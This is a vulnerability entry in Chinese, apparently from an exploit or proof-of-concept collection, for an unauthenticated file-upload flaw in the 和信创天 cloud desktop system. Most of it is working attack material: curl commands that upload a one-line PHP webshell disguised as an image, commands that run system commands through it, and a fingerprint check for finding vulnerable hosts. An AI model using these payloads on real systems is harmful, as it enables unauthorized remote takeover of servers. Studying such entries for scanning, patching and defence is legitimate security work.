---
id: HEXIN-UPLOAD-RCE
title: 和信创天云桌面系统 upload_file.php 任意文件上传 RCE
product: hexin
vendor: 和信创天
version_affected: "和信创天云桌面系统"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产]
fingerprint: ["和信创天", "云桌面"]
---

## 漏洞描述

和信创天云桌面系统的 `/Upload/upload_file.php` 接口存在未授权任意文件上传漏洞。该接口未对上传文件类型和后缀做任何限制，攻击者可直接上传 PHP webshell 获取服务器权限。

## 影响版本

- 和信创天云桌面系统

## 前置条件

- 无需认证

## 利用步骤

1. 向 `/Upload/upload_file.php?l=1` 发送 multipart POST 上传 PHP 文件
2. 访问 `/Upload/1/文件名.php` 执行命令

## Payload

### 上传 webshell

```bash
curl -s "http://target/Upload/upload_file.php?l=1" \
  -F "file=@shell.php;filename=cmd.php;type=image/avif"
```

其中 `shell.php` 内容：
```php
<?php system($_GET['cmd']); ?>
```

### 一行式上传

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/cmd.php
curl -s "http://target/Upload/upload_file.php?l=1" \
  -F "file=@/tmp/cmd.php;filename=cmd.php;type=image/avif"
```

### 执行命令

```bash
curl -s "http://target/Upload/1/cmd.php?cmd=id"
curl -s "http://target/Upload/1/cmd.php?cmd=whoami"
```

## 验证方法

```bash
# 上传后访问 webshell
curl -s "http://target/Upload/1/cmd.php?cmd=id" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "和信创天\|云桌面"
```
